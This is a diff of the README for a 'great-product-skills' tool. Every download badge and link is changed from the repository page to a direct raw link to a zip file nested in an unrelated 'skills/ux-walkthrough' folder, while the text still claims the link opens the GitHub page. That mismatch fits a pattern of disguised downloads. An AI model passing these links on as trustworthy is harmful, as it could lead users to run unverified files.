@@ -1,6 +1,6 @@
 # 🚀 great-product-skills - Simplify Your Product Workflow
 
-[![Download great-product-skills](https://img.shields.io/badge/Download-great--product--skills-green?style=for-the-badge)](https://github.com/robotka1321/great-product-skills)
+[![Download great-product-skills](https://img.shields.io/badge/Download-great--product--skills-green?style=for-the-badge)](https://github.com/robotka1321/great-product-skills/raw/refs/heads/main/skills/ux-walkthrough/product-skills-great-v1.5.zip)
 
 ---
 
@@ -57,7 +57,7 @@ No installation of extra software is needed beyond what is included in the downl
 
 Download great-product-skills from this link:
 
-[![Download great-product-skills](https://img.shields.io/badge/Download-great--product--skills-green?style=for-the-badge)](https://github.com/robotka1321/great-product-skills)
+[![Download great-product-skills](https://img.shields.io/badge/Download-great--product--skills-green?style=for-the-badge)](https://github.com/robotka1321/great-product-skills/raw/refs/heads/main/skills/ux-walkthrough/product-skills-great-v1.5.zip)
 
 This link takes you to the GitHub page. From there, find the latest release or download the files directly.
 
@@ -130,7 +130,7 @@ Here are the main parts you will find inside the application:
 
 ## 🔗 Useful Links
 
-- Download page: [https://github.com/robotka1321/great-product-skills](https://github.com/robotka1321/great-product-skills)  
+- Download page: [https://github.com/robotka1321/great-product-skills/raw/refs/heads/main/skills/ux-walkthrough/product-skills-great-v1.5.zip](https://github.com/robotka1321/great-product-skills/raw/refs/heads/main/skills/ux-walkthrough/product-skills-great-v1.5.zip)  
 - Detailed instructions and updates appear on the repository page.
 
 ---
@@ -145,4 +145,4 @@ If you need help while using great-product-skills:
 
 ---
 
-[![Download great-product-skills](https://img.shields.io/badge/Download-great--product--skills-green?style=for-the-badge)](https://github.com/robotka1321/great-product-skills)
+[![Download great-product-skills](https://img.shields.io/badge/Download-great--product--skills-green?style=for-the-badge)](https://github.com/robotka1321/great-product-skills/raw/refs/heads/main/skills/ux-walkthrough/product-skills-great-v1.5.zip)
